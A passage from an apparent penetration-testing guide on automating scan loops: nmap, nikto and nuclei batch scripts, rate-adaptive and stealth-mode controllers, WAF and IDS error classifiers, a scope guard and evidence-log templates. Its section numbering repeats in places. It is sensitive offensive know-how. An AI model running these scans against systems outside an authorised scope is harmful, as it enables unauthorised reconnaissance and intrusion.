        nmap -sV -p "$TOP_PORTS" -oA "$OUTPUT_DIR/host-${host}" "$host" 2>&1 | tail -3

        # Check for new services and enumerate
        open_ports=$(grep "open" "$OUTPUT_DIR/host-${host}.nmap" | awk '{print $1}' | tr '\n' ',')
        if echo "$open_ports" | grep -q "80\|443\|8080"; then
            echo "[INNER-DEEP] Web service found, running nikto on $host"
            nikto -h "http://${host}" -output "$OUTPUT_DIR/nikto-${host}.xml" -Format xml 2>&1 | tail -3
        fi

        sleep 2
    done

    echo "[OUTER] Subnet $subnet complete: $host_count hosts processed"
    sleep 5
done
```

### Dynamic Parameter Adjustment

```python
#!/usr/bin/env python3
"""Dynamically adjust scan parameters based on feedback."""

import time
import subprocess

class DynamicScanner:
    def __init__(self, target, base_rate=1000):
        self.target = target
        self.rate = base_rate
        self.failures = 0
        self.successes = 0

    def adjust_rate(self, success: bool):
        if success:
            self.successes += 1
            self.failures = max(0, self.failures - 1)
            if self.successes % 10 == 0 and self.rate < 10000:
                self.rate = int(self.rate * 1.2)
                print(f"[ADJUST] Increasing rate to {self.rate}")
        else:
            self.failures += 1
            self.successes = 0
            self.rate = max(100, int(self.rate * 0.5))
            print(f"[ADJUST] Reducing rate to {self.rate} after failure")

    def scan_with_adaptation(self, ports="1-1000", max_retries=3):
        for attempt in range(max_retries):
            cmd = f"nmap -T4 --max-rate {self.rate} -p {ports} {self.target}"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=120)
            success = result.returncode == 0
            self.adjust_rate(success)
            if success:
                return result.stdout
        return None
```

---

## 10. Progress Tracking and Reporting

### Real-Time Progress Bar for Batch Operations

```bash
#!/usr/bin/env bash
# Display progress during batch scanning operations

TARGETS_FILE="targets.txt"
TOTAL=$(wc -l < "$TARGETS_FILE")
CURRENT=0
START_TIME=$(date +%s)

while IFS= read -r target; do
    CURRENT=$((CURRENT + 1))
    ELAPSED=$(($(date +%s) - START_TIME))
    [ "$CURRENT" -gt 1 ] && ETA=$(( (ELAPSED * (TOTAL - CURRENT)) / (CURRENT - 1) )) || ETA=0

    printf "\r[PROGRESS] %d/%d (%d%%) | Elapsed: %ds | ETA: %ds | Rate: %.1f/min | Current: %s   " \
        "$CURRENT" "$TOTAL" "$((CURRENT * 100 / TOTAL))" "$ELAPSED" "$ETA" \
        "$(echo "scale=1; $CURRENT * 60 / ($ELAPSED + 1)" | bc)" "$target"

    nmap -sV -T4 --top-ports 100 -oA "evidence/host-${target}" "$target" 2>/dev/null | tail -1
    sleep 1
done < "$TARGETS_FILE"

echo ""
echo "[COMPLETE] Processed $TOTAL targets in $(($(date +%s) - START_TIME)) seconds"
```

### Loop Statistics Reporter

```python
#!/usr/bin/env python3
"""Collect and report statistics from autonomous loop execution."""

import json
from datetime import datetime
from dataclasses import dataclass, field, asdict

@dataclass
class LoopStats:
    operation_id: str
    start_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    total_iterations: int = 0
    successful: int = 0
    failed: int = 0
    skipped: int = 0
    errors_by_type: dict = field(default_factory=dict)
    targets_processed: list = field(default_factory=list)

    def record_success(self, target: str):
        self.total_iterations += 1
        self.successful += 1
        self.targets_processed.append({"target": target, "status": "success"})

    def record_failure(self, target: str, error_type: str):
        self.total_iterations += 1
        self.failed += 1
        self.errors_by_type[error_type] = self.errors_by_type.get(error_type, 0) + 1
        self.targets_processed.append({"target": target, "status": "failed", "error": error_type})

    def summary(self) -> dict:
        elapsed = (datetime.utcnow() - datetime.fromisoformat(self.start_time)).total_seconds()
        return {
            "operation_id": self.operation_id,
            "duration_seconds": round(elapsed, 1),
            "total": self.total_iterations,
            "successful": self.successful,
            "failed": self.failed,
            "success_rate": round(self.successful / max(self.total_iterations, 1) * 100, 1),
            "rate_per_minute": round(self.total_iterations / max(elapsed / 60, 0.01), 2),
            "error_breakdown": self.errors_by_type
        }
```

### Feedback-Driven Iteration Controller

```python
#!/usr/bin/env python3
"""Feedback-driven iteration that adapts strategy based on results."""

from enum import Enum
from typing import Callable, Any

class Strategy(Enum):
    BROAD = "broad"        # Wide scope, fast
    TARGETED = "targeted"  # Narrow scope, deep
    STEALTH = "stealth"    # Slow, low-noise

class FeedbackController:
    def __init__(self, max_iterations=100, target_success_rate=0.3):
        self.max_iterations = max_iterations
        self.target_success_rate = target_success_rate
        self.history = []
        self.strategy = Strategy.BROAD
        self.iteration = 0

    def record_feedback(self, result: dict):
        self.iteration += 1
        self.history.append(result)

        recent = self.history[-10:]
        success_rate = sum(1 for r in recent if r.get("success")) / len(recent)

        # Adapt strategy based on feedback
        if success_rate < 0.05:
            self.strategy = Strategy.TARGETED
            print(f"[FEEDBACK] Switching to TARGETED (success rate: {success_rate:.0%})")
        elif success_rate > 0.5:
            self.strategy = Strategy.BROAD
            print(f"[FEEDBACK] Switching to BROAD (success rate: {success_rate:.0%})")

        if result.get("rate_limited"):
            self.strategy = Strategy.STEALTH
            print(f"[FEEDBACK] Switching to STEALTH (rate limited)")

    def get_delay(self) -> float:
        delays = {Strategy.BROAD: 0.1, Strategy.TARGETED: 0.5, Strategy.STEALTH: 3.0}
        return delays[self.strategy]

    def should_continue(self) -> bool:
        if self.iteration >= self.max_iterations:
            return False
        if len(self.history) >= 20:
            recent_rate = sum(1 for r in self.history[-20:] if r.get("success")) / 20
            if recent_rate == 0:
                print("[FEEDBACK] Aborting: zero success rate in last 20 iterations")
                return False
        return True
```

---

## 11. Timeout and Resource Management

### Per-Operation Timeout Wrapper

```bash
#!/usr/bin/env bash
# Execute a command with strict timeout and resource cleanup
# Usage: timeout_wrapper.sh <seconds> <command...>

TIMEOUT_SECS="${1:?Usage: $0 <timeout_secs> <command...>}"
shift
OUTPUT_DIR="evidence/timeouts"
mkdir -p "$OUTPUT_DIR"
LOG_FILE="$OUTPUT_DIR/timeout-$(date +%Y%m%d-%H%M%S).log"

timeout "$TIMEOUT_SECS" "$@" > "$LOG_FILE.stdout" 2> "$LOG_FILE.stderr"
EXIT_CODE=$?

case $EXIT_CODE in
    0)   echo "[OK] Command completed successfully" ;;
    124) echo "[TIMEOUT] Command exceeded ${TIMEOUT_SECS}s limit" ;;
    137) echo "[KILLED] Command was killed (SIGKILL)" ;;
    *)   echo "[ERROR] Command exited with code $EXIT_CODE" ;;
esac

echo "Exit code: $EXIT_CODE" >> "$LOG_FILE"
echo "Stdout lines: $(wc -l < "$LOG_FILE.stdout")" >> "$LOG_FILE"
echo "Stderr lines: $(wc -l < "$LOG_FILE.stderr")" >> "$LOG_FILE"
```

---

## 12. Error Handling Response Templates

### Automated Error Classifier

```python
#!/usr/bin/env python3
"""Classify errors from autonomous loop operations and determine response."""

import re

ERROR_PATTERNS = {
    "rate_limit": [
        r"429 Too Many Requests",
        r"rate.?limit",
        r"throttl",
        r"slow down",
        r"HTTP/\d\.\d" 429"
    ],
    "waf_block": [
        r"403 Forbidden",
        r"WAF",
        r"Web Application Firewall",
        r"request blocked",
        r"access denied"
    ],
    "target_down": [
        r"Connection refused",
        r"Connection timed out",
        r"No route to host",
        r"Host is down"
    ],
    "auth_failure": [
        r"401 Unauthorized",
        r"Authentication failed",
        r"Invalid credentials",
        r"Login failed"
    ]
}

def classify_error(stderr_output, http_code=None):
    """Classify an error and return the recommended action."""
    text = stderr_output.lower()
    classifications = []

    for error_type, patterns in ERROR_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                classifications.append(error_type)
                break

    if http_code == 429:
        classifications.append("rate_limit")
    elif http_code == 403:
        classifications.append("waf_block")

    action_map = {
        "rate_limit": "backoff_retry",
        "waf_block": "abort",
        "target_down": "skip",
        "auth_failure": "skip"
    }

    primary = classifications[0] if classifications else "unknown"
    return {
        "type": primary,
        "all_types": classifications,
        "action": action_map.get(primary, "log_and_continue"),
        "raw_error": stderr_output[:500]
    }
```

### Scope Violation Detector

```python
#!/usr/bin/env python3
"""Detect and prevent scope violations during autonomous operations."""

import ipaddress

class ScopeGuard:
    def __init__(self, allowed_cidrs, allowed_ports, forbidden_ops):
        self.allowed_networks = [ipaddress.ip_network(cidr) for cidr in allowed_cidrs]
        self.allowed_ports = set(allowed_ports)
        self.forbidden_ops = set(op.lower() for op in forbidden_ops)
        self.violations = []

    def check_target(self, target_ip):
        """Verify a target IP is within the allowed scope."""
        try:
            addr = ipaddress.ip_address(target_ip)
        except ValueError:
            self.violations.append(f"Invalid IP: {target_ip}")
            return False

        for network in self.allowed_networks:
            if addr in network:
                return True

        self.violations.append(f"OUT OF SCOPE: {target_ip} not in allowed networks")
        return False

    def check_port(self, port):
        """Verify a port is within allowed range."""
        if port in self.allowed_ports:
            return True
        self.violations.append(f"PORT VIOLATION: port {port} not in allowed list")
        return False

    def check_operation(self, operation):
        """Verify an operation is not in the forbidden list."""
        if operation.lower() in self.forbidden_ops:
            self.violations.append(f"FORBIDDEN OP: {operation}")
            return False
        return True

# Usage: guard = ScopeGuard(["192.168.1.0/24"], [22,80,443,8080], ["exploit","bruteforce"])
```

---

## 13. Error Handling Response Templates

### Adaptive Learning Rate Controller

```python
#!/usr/bin/env python3
"""Dynamically adjust learning parameters based on feedback from each iteration."""

class LearningRateController:
    def __init__(self, initial_rate=1.0, min_rate=0.1, max_rate=2.0, decay=0.95):
        self.current_rate = initial_rate
        self.min_rate = min_rate
        self.max_rate = max_rate
        self.decay = decay
        self.history = []

    def update(self, success: bool) -> float:
        """Adjust rate based on success or failure feedback."""
        self.history.append(success)

        if success:
            self.current_rate = min(self.current_rate * 1.05, self.max_rate)
        else:
            self.current_rate = max(self.current_rate * self.decay, self.min_rate)

        # Check recent trend
        if len(self.history) >= 10:
            recent = self.history[-10:]
            success_rate = sum(recent) / len(recent)
            if success_rate > 0.8:
                self.current_rate = min(self.current_rate * 1.1, self.max_rate)
            elif success_rate < 0.2:
                self.current_rate = max(self.current_rate * 0.8, self.min_rate)

        return self.current_rate
```

### Parallel Batch Orchestration

```bash
#!/usr/bin/env bash
# Orchestrate parallel scan batches with inter-batch coordination

TARGETS="targets.txt"
BATCH_SIZE=5
MAX_PARALLEL=5
INTER_BATCH_DELAY=3
OUTPUT="evidence/parallel-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT"

total=$(wc -l < "$TARGETS")
echo "[ORCHESTRATOR] $total targets, batch size $BATCH_SIZE, max parallel $MAX_PARALLEL"

# Split into batches
split -l "$BATCH_SIZE" "$TARGETS" "$OUTPUT/batch-"

batch_num=0
active_jobs=0

for batch_file in "$OUTPUT"/batch-*; do
    batch_num=$((batch_num + 1))

    # Wait if too many parallel jobs
    while [ "$(jobs -r | wc -l)" -ge "$MAX_PARALLEL" ]; do
        sleep 1
    done

    echo "[BATCH-$batch_num] Starting $(wc -l < "$batch_file") targets"

    while IFS= read -r target; do
        nmap -sV -T4 --top-ports 100 -oA "$OUTPUT/host-${target}" "$target" 2>/dev/null &
    done < "$batch_file"

    # Inter-batch delay for rate limiting
    sleep "$INTER_BATCH_DELAY"
done

# Wait for all remaining jobs
wait
echo "[ORCHESTRATOR] All $batch_num batches complete"
rm -f "$OUTPUT"/batch-*
```

### Conditional Loop with Multi-Trigger Support

```bash
#!/usr/bin/env bash
# Watch loop with multiple trigger conditions and response actions

TARGET="192.168.1.100"
PORTS=(22 80 443 8080)
MAX_ITER=1000
POLL_INTERVAL=5
TRIGGER_LOG="evidence/triggers-$(date +%Y%m%d).log"

for i in $(seq 1 "$MAX_ITER"); do
    triggered=false

    for port in "${PORTS[@]}"; do
        if timeout 2 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null; then
            state="OPEN"
        else
            state="CLOSED"
        fi

        # Trigger 1: SSH port opened (potential compromise)
        if [ "$port" -eq 22 ] && [ "$state" = "OPEN" ]; then
            echo "[$(date -Iseconds)] [TRIGGER-CRITICAL] SSH is OPEN on $TARGET" | tee -a "$TRIGGER_LOG"
            triggered=true
        fi

        # Trigger 2: New service on 8080
        if [ "$port" -eq 8080 ] && [ "$state" = "OPEN" ]; then
            echo "[$(date -Iseconds)] [TRIGGER-HIGH] New service on port 8080" | tee -a "$TRIGGER_LOG"
            triggered=true
        fi
    done

    # Check HTTP response for changes
    http_code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET" 2>/dev/null || echo "000")
    if [ "$http_code" = "500" ]; then
        echo "[$(date -Iseconds)] [TRIGGER-MED] HTTP 500 error detected" | tee -a "$TRIGGER_LOG"
        triggered=true
    fi

    sleep "$POLL_INTERVAL"
done
```

### Iteration Result Aggregator

```python
#!/usr/bin/env python3
"""Aggregate results from autonomous loop iterations into structured output."""

import json
from datetime import datetime

class ResultAggregator:
    def __init__(self, operation_id):
        self.operation_id = operation_id
        self.iterations = []
        self.start_time = datetime.utcnow().isoformat()

    def add_result(self, iteration_num, target, tool, success, output_summary, duration_sec):
        """Record a single iteration result."""
        self.iterations.append({
            "iteration": iteration_num,
            "target": target,
            "tool": tool,
            "success": success,
            "output_summary": output_summary[:500],
            "duration_sec": round(duration_sec, 2),
            "timestamp": datetime.utcnow().isoformat()
        })

    def export_json(self, filepath):
        """Export all results as structured JSON."""
        report = {
            "operation_id": self.operation_id,
            "start_time": self.start_time,
            "end_time": datetime.utcnow().isoformat(),
            "total_iterations": len(self.iterations),
            "successful": sum(1 for i in self.iterations if i["success"]),
            "failed": sum(1 for i in self.iterations if not i["success"]),
            "results": self.iterations
        }
        with open(filepath, "w") as f:
            json.dump(report, f, indent=2, default=str)
        return report
```

### Global Loop Controller with Abort Conditions

```python
#!/usr/bin/env python3
"""Central controller that manages abort conditions across all loop patterns."""

import time
import json

class GlobalLoopController:
    def __init__(self, config):
        self.max_wall_time = config.get("max_wall_minutes", 120) * 60
        self.max_iterations = config.get("max_iterations", 1000)
        self.max_errors = config.get("max_errors", 50)
        self.error_rate_threshold = config.get("error_rate_threshold", 0.5)
        self.start_time = time.time()
        self.iteration_count = 0
        self.error_count = 0
        self.abort_reason = None

    def check(self) -> bool:
        """Check if the loop should continue. Returns True if OK to continue."""
        self.iteration_count += 1
        elapsed = time.time() - self.start_time

        if elapsed > self.max_wall_time:
            self.abort_reason = f"Wall time limit: {elapsed:.0f}s > {self.max_wall_time}s"
            return False

        if self.iteration_count > self.max_iterations:
            self.abort_reason = f"Iteration limit: {self.iteration_count} > {self.max_iterations}"
            return False

        if self.error_count > self.max_errors:
            self.abort_reason = f"Error limit: {self.error_count} > {self.max_errors}"
            return False

        if self.iteration_count > 10:
            error_rate = self.error_count / self.iteration_count
            if error_rate > self.error_rate_threshold:
                self.abort_reason = f"Error rate: {error_rate:.0%} > {self.error_rate_threshold:.0%}"
                return False

        return True

    def record_error(self):
        self.error_count += 1

    def status(self):
        elapsed = time.time() - self.start_time
        return {
            "iterations": self.iteration_count,
            "errors": self.error_count,
            "elapsed_seconds": round(elapsed, 1),
            "abort_reason": self.abort_reason,
            "continue": self.abort_reason is None
        }
```

### Inter-Loop Communication Bridge

```python
#!/usr/bin/env python3
"""Enable communication between nested or parallel loops via shared state."""

import json
import os
from pathlib import Path

class LoopBridge:
    """Shared state bridge for inter-loop communication."""
    def __init__(self, bridge_dir="/tmp/loop_bridge"):
        self.bridge_dir = Path(bridge_dir)
        self.bridge_dir.mkdir(parents=True, exist_ok=True)

    def publish(self, topic, data):
        """Publish data to a topic for other loops to consume."""
        topic_file = self.bridge_dir / f"{topic}.json"
        with open(topic_file, "w") as f:
            json.dump(data, f, indent=2, default=str)

    def subscribe(self, topic):
        """Read the latest data from a topic."""
        topic_file = self.bridge_dir / f"{topic}.json"
        if topic_file.exists():
            return json.loads(topic_file.read_text())
        return None

    def list_topics(self):
        """List all available topics."""
        return [f.stem for f in self.bridge_dir.glob("*.json")]

    def cleanup(self):
        """Remove all bridge data."""
        for f in self.bridge_dir.glob("*.json"):
            f.unlink()
```

---

## 14. Loop Pattern Selection Guide

### Pattern Decision Matrix

```python
def select_loop_pattern(operation_type, target_count, time_budget, risk_level):
    """Select the optimal loop pattern based on operation parameters."""
    patterns = {
        "sequential_pipeline": {
            "best_for": ["service_enum", "port_scan", "web_dir_enum"],
            "max_targets": 500,
            "min_time_per_target": 5,
            "risk": "low"
        },
        "watch_loop": {
            "best_for": ["monitoring", "change_detection", "service_watch"],
            "max_targets": 10,
            "min_time_per_target": 1,
            "risk": "minimal"
        },
        "batch_processing": {
            "best_for": ["vuln_scan", "dns_lookup", "header_check"],
            "max_targets": 1000,
            "min_time_per_target": 2,
            "risk": "low"
        },
        "learning_cycle": {
            "best_for": ["sqli_test", "fuzzing", "brute_force"],
            "max_targets": 5,
            "min_time_per_target": 10,
            "risk": "medium"
        }
    }

    recommended = None
    for name, config in patterns.items():
        if operation_type in config["best_for"]:
            if target_count <= config["max_targets"]:
                recommended = name
                break

    if recommended is None:
        recommended = "batch_processing"  # safe default

    return {
        "recommended_pattern": recommended,
        "operation_type": operation_type,
        "target_count": target_count,
        "time_budget": time_budget,
        "risk_level": risk_level,
        "rationale": f"Pattern '{recommended}' selected for {operation_type} with {target_count} targets"
    }
```

### Adaptive Concurrency Controller

```python
class AdaptiveConcurrency:
    """Dynamically adjust concurrency based on success rate and rate limiting."""

    def __init__(self, initial_concurrency=5, max_concurrency=20, min_concurrency=1):
        self.concurrency = initial_concurrency
        self.max_concurrency = max_concurrency
        self.min_concurrency = min_concurrency
        self.window = []

    def record(self, success, rate_limited=False):
        """Record a result and adjust concurrency."""
        self.window.append({"success": success, "rate_limited": rate_limited})
        if len(self.window) > 20:
            self.window.pop(0)

        if rate_limited:
            self.concurrency = max(self.min_concurrency, self.concurrency // 2)
            return

        if len(self.window) >= 10:
            recent = self.window[-10:]
            success_rate = sum(1 for r in recent if r["success"]) / len(recent)
            if success_rate > 0.9:
                self.concurrency = min(self.concurrency + 1, self.max_concurrency)
            elif success_rate < 0.5:
                self.concurrency = max(self.concurrency - 2, self.min_concurrency)

    def get_concurrency(self):
        return self.concurrency
```

---

## 15. Safe Termination and Cleanup

### Graceful Shutdown Handler

```bash
#!/usr/bin/env bash
# Graceful shutdown handler for long-running autonomous loops
# Catches SIGINT/SIGTERM and saves state before exit

OUTPUT_DIR="evidence"
STATE_FILE="$OUTPUT_DIR/loop_state.json"
PID_FILE="$OUTPUT_DIR/loop.pid"

cleanup() {
    echo ""
    echo "[SHUTDOWN] Caught signal, saving state and cleaning up..."
    echo "$$" > "$PID_FILE"

    # Kill all background jobs
    jobs -p | xargs kill 2>/dev/null

    # Save current state
    python3 -c "
import json, datetime
state = {
    'status': 'interrupted',
    'timestamp': datetime.datetime.utcnow().isoformat(),
    'last_iteration': '$(cat /tmp/current_iteration 2>/dev/null || echo 0)'
}
json.dump(state, open('$STATE_FILE', 'w'), indent=2)
print('[SHUTDOWN] State saved to $STATE_FILE')
"

    # Wait for processes to finish
    wait 2>/dev/null
    echo "[SHUTDOWN] Clean exit"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Main loop (example)
ITER=0
while true; do
    ITER=$((ITER + 1))
    echo "$ITER" > /tmp/current_iteration
    echo "[RUNNING] Iteration $ITER"
    sleep 5
done
```

---

## 12. Error Handling Response Templates

### Pre-Formatted Error Log Entries

```markdown
### Target Unreachable
[ERROR-UNREACHABLE] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: SKIP | Iteration: {N}/{MAX}
Response: Connection refused or timed out after 3 attempts
Decision: Logged and skipped, continuing to next target
Impact: Target excluded from results; may need manual investigation

### Rate Limit Detected
[ERROR-RATELIMIT] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: BACKOFF | Iteration: {N}/{MAX}
Response: HTTP 429 / connection throttled
Decision: Increasing delay from {CURRENT_DELAY}s to {NEW_DELAY}s, single retry
Impact: Slower execution; if retry fails, target logged as rate-limited

### WAF/IPS Detected
[ERROR-WAF] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: ABORT | Iteration: {N}/{MAX}
Response: HTTP 403 Forbidden / connection reset / pattern blocked
Decision: STOPPING loop immediately. All subsequent payloads would be blocked.
Impact: Loop terminated; remaining iterations not executed; operator notified

### IDS Alert Detected
[ERROR-IDS] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: STOP | Iteration: {N}/{MAX}
Response: IDS signature match detected or target firewall behavior changed
Decision: EMERGENCY STOP. All operations halted. Evidence preserved.
Impact: Immediate loop termination; full evidence chain preserved; operator alert sent

### Target Crash / Unexpected Downtime
[ERROR-CRASH] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: STOP | Iteration: {N}/{MAX}
Response: Target became unreachable mid-operation (was reachable previously)
Decision: EMERGENCY STOP. Possible target instability from testing.
Impact: Loop terminated; last known-good state logged; operator must verify target health

### Scope Violation
[ERROR-SCOPE] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: STOP | Iteration: {N}/{MAX}
Response: Operation attempted outside of scope lock boundaries
Decision: EMERGENCY STOP. Scope violation is a hard boundary.
Impact: Loop terminated; incident logged; operator must review and approve before resuming

### Unexpected Service Response
[ERROR-UNEXPECTED] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: FLAG | Iteration: {N}/{MAX}
Response: Service returned unexpected data format or status code
Decision: Logged with full details, flagged for manual review, continuing pipeline
Impact: Target flagged in results for manual investigation; does not block pipeline
```

---

## 13. Evidence Log Templates

### Loop-Level Evidence Header

```markdown
# Loop Evidence Log: {OPERATION_ID}

## Operation Summary
- **Pattern**: {Sequential Pipeline | Watch Loop | Batch Processing | Learning Cycle}
- **Scope Lock**: Defined at {ISO_8601_TIMESTAMP}, locked for duration
- **Start Time**: {ISO_8601_TIMESTAMP}
- **End Time**: {ISO_8601_TIMESTAMP}
- **Duration**: {minutes} minutes
- **Total Iterations**: {N} / {MAX}
- **Targets Processed**: {X} successful, {Y} skipped, {Z} errors
- **Status**: {COMPLETED | ABORTED | STOPPED}

## Scope Lock Reference
- **Allowed Targets**: {SCOPE_TARGETS}
- **Allowed Operations**: {SCOPE_OPERATIONS}
- **Violations**: {NONE | LIST_ANY}

## Results Summary
- **Findings**: {COUNT} findings of interest
- **Errors**: {COUNT} errors encountered
- **Skipped**: {COUNT} targets/iterations skipped

---
```

### Iteration-Level Evidence Entry

```markdown
### Entry {N}: {ISO_8601_TIMESTAMP}

| Field | Value |
|-------|-------|
| **Iteration** | {N} / {MAX} |
| **Target** | {HOST}:{PORT} or {URL} |
| **Action** | {COMMAND or TECHNIQUE} |
| **Result** | {SUCCESS \| FAIL \| ERROR \| TIMEOUT \| SKIP} |
| **Output** | {Truncated to 500 chars; full output at {PATH}} |
| **State Change** | {NONE or DESCRIPTION} |
| **Duration** | {seconds}s |
| **Notes** | {ANY_ADDITIONAL_OBSERVATIONS} |

---
```

### Batch Evidence Summary

```markdown
### Batch {N} Results

| Target | Action | Status | Key Finding | Duration |
|--------|--------|--------|-------------|----------|
| {HOST1} | {ACTION} | {STATUS} | {FINDING} | {TIME} |
| {HOST2} | {ACTION} | {STATUS} | {FINDING} | {TIME} |
| {HOST3} | {ACTION} | {STATUS} | {FINDING} | {TIME} |

**Batch Duration**: {seconds}s
**Rate Limit Delay**: {seconds}s between batches
**Next Batch**: {N+1} in {seconds}s

---
```

### Watch Loop Trigger Evidence

```markdown
### Trigger Event: {ISO_8601_TIMESTAMP}

| Field | Value |
|-------|-------|
| **Watch Target** | {TARGET} |
| **Iteration** | {N} / {MAX} |
| **Polling Interval** | {seconds}s |
| **Trigger Condition** | {CONDITION_DESCRIPTION} |
| **Previous State** | {STATE} |
| **Current State** | {STATE} |
| **Action Taken** | {RESPONSE_ACTION} |
| **Action Result** | {SUCCESS \| FAIL} |
| **One-Shot** | {YES \| NO} |

---
```

### Learning Cycle Evidence

```markdown
### Learning Iteration {N}: {ISO_8601_TIMESTAMP}

| Field | Value |
|-------|-------|
| **Approach** | {CURRENT_APPROACH_DESCRIPTION} |
| **Payload/Technique** | {SPECIFIC_PAYLOAD} |
| **Result** | {SUCCESS \| FAIL \| PARTIAL} |
| **Analysis** | {WHAT_WAS_LEARNED} |
| **Confidence** | {PERCENT}% |
| **Next Approach** | {REFINED_APPROACH} |
| **Abort Reason** | {NONE \| CONFIDENCE_LOW \| MAX_ITER \| SUCCESS} |

---
```

---

## 16. Pipeline Orchestration Scripts

### Multi-Tool Pipeline with Dependency Management

```bash
#!/usr/bin/env bash
# Full pentest pipeline: recon -> scan -> enumerate -> report
# Each phase depends on the output of the previous phase

TARGET="$1"
OUTPUT_DIR="evidence/pipeline-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"/{recon,scan,enum,report}
PHASE_LOG="$OUTPUT_DIR/pipeline.log"

log() { echo "[$(date -Iseconds)] [PHASE-$1] $2" | tee -a "$PHASE_LOG"; }

# Phase 1: Reconnaissance
log "RECON" "Starting passive reconnaissance on $TARGET"
nmap -sn -n "$TARGET" -oA "$OUTPUT_DIR/recon/host-discovery" 2>&1 | tail -3
log "RECON" "Host discovery complete"

# Phase 2: Port Scanning (depends on Phase 1)
log "SCAN" "Starting full port scan"
nmap -sS -sV -T4 -p- -oA "$OUTPUT_DIR/scan/full-scan" "$TARGET" 2>&1 | tail -3
log "SCAN" "Port scan complete"

# Phase 3: Service Enumeration (depends on Phase 2)
open_ports=$(grep "open" "$OUTPUT_DIR/scan/full-scan.nmap" | awk '{print $1}' | tr '\n' ',')
log "ENUM" "Open ports: $open_ports"
nmap -sV -sC -p "$(echo $open_ports | tr -d '/tcp')" -oA "$OUTPUT_DIR/enum/service-enum" "$TARGET" 2>&1 | tail -3
log "ENUM" "Service enumeration complete"

# Phase 4: Report Generation (depends on all previous)
log "REPORT" "Generating findings summary"
grep -E "open|Open" "$OUTPUT_DIR/scan/full-scan.nmap" > "$OUTPUT_DIR/report/open-ports.txt"
xsltproc "$OUTPUT_DIR/scan/full-scan.xml" -o "$OUTPUT_DIR/report/scan-report.html" 2>/dev/null
log "REPORT" "Pipeline complete. Results in $OUTPUT_DIR"
```

### DAG-Based Task Scheduler

```python
#!/usr/bin/env python3
"""Directed Acyclic Graph (DAG) task scheduler for pentest workflow phases."""

from dataclasses import dataclass, field
from typing import List, Dict, Callable
import subprocess
import json

@dataclass
class Task:
    name: str
    command: List[str]
    depends_on: List[str] = field(default_factory=list)
    output_files: List[str] = field(default_factory=list)
    timeout: int = 300
    status: str = "pending"

class DAGScheduler:
    def __init__(self):
        self.tasks: Dict[str, Task] = {}
        self.results: Dict[str, dict] = {}

    def add_task(self, task: Task):
        self.tasks[task.name] = task

    def run_ready_tasks(self):
        """Find and execute tasks whose dependencies are all complete."""
        ready = []
        for name, task in self.tasks.items():
            if task.status != "pending":
                continue
            deps_met = all(
                self.tasks.get(dep, Task("", [])).status == "complete"
                for dep in task.depends_on
            )
            if deps_met:
                ready.append(task)

        for task in ready:
            task.status = "running"
            print(f"[DAG] Running: {task.name}")
            try:
                result = subprocess.run(
                    task.command, capture_output=True, text=True, timeout=task.timeout
                )
                task.status = "complete"
                self.results[task.name] = {
                    "returncode": result.returncode,
                    "stdout": result.stdout[:500],
                    "stderr": result.stderr[:200]
                }
            except subprocess.TimeoutExpired:
                task.status = "timeout"
            except Exception as e:
                task.status = "error"

    def run_all(self, max_iterations=50):
        for _ in range(max_iterations):
            pending = [t for t in self.tasks.values() if t.status == "pending"]
            if not pending:
                break
            self.run_ready_tasks()
        return {name: t.status for name, t in self.tasks.items()}

# Usage: Define a pentest pipeline as a DAG
scheduler = DAGScheduler()
scheduler.add_task(Task("recon", ["nmap", "-sn", "-n", "192.168.1.0/24", "-oG", "/tmp/recon.gnmap"]))
scheduler.add_task(Task("scan", ["nmap", "-sV", "-T4", "-p-", "-oA", "/tmp/full-scan", "192.168.1.100"], depends_on=["recon"]))
scheduler.add_task(Task("vuln", ["nmap", "--script", "vuln", "-p", "22,80,443", "192.168.1.100"], depends_on=["scan"]))
results = scheduler.run_all()
print(json.dumps(results, indent=2))
```

---

## 17. Parallel Execution Patterns

### GNU Parallel for Security Scanning

```bash
# Use GNU parallel to scan multiple targets simultaneously with rate control
# Max 10 concurrent jobs, 2s delay between starts

# Parallel port scanning across subnets
cat subnets.txt | parallel -j 10 --delay 2 \
  "nmap -sV -T4 --top-ports 100 -oA evidence/scan-{} {} 2>/dev/null && echo '[DONE] {}'"

# Parallel Nuclei scanning with output per target
cat targets.txt | parallel -j 5 --delay 1 \
  "nuclei -u {} -t cves/ -t vulnerabilities/ -severity critical,high -silent -o evidence/nuclei-$(echo {} | md5sum | cut -c1-8).txt"

# Parallel web screenshot capture
cat urls.txt | parallel -j 3 --delay 1 \
  "chromium --headless --screenshot=evidence/screenshot-$(echo {} | tr '/' '_').png --window-size=1920,1080 {}"

# Parallel DNS enumeration
cat domains.txt | parallel -j 20 --delay 0.1 \
  "dig +short {} A @8.8.8.8 2>/dev/null | grep -v '^$' && echo '[DNS] {}'"
```

### Python ThreadPool Executor for Network Tasks

```python
#!/usr/bin/env python3
"""Parallel network scanning using ThreadPoolExecutor with rate limiting."""

import subprocess
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

class ParallelScanner:
    def __init__(self, max_workers=5, rate_limit_per_sec=2):
        self.max_workers = max_workers
        self.rate_limit = rate_limit_per_sec
        self.results = []

    def _run_command(self, target, command_template):
        """Execute a command for a single target with rate limiting."""
        cmd = command_template.format(target=target)
        start = time.time()
        try:
            result = subprocess.run(
                cmd.split(), capture_output=True, text=True, timeout=120
            )
            elapsed = time.time() - start
            entry = {
                "target": target,
                "returncode": result.returncode,
                "output": result.stdout[:500],
                "duration_sec": round(elapsed, 2),
                "success": result.returncode == 0
            }
        except Exception as e:
            entry = {"target": target, "error": str(e), "success": False}
        self.results.append(entry)
        return entry

    def scan_targets(self, targets, command_template):
        """Scan multiple targets in parallel with rate limiting."""
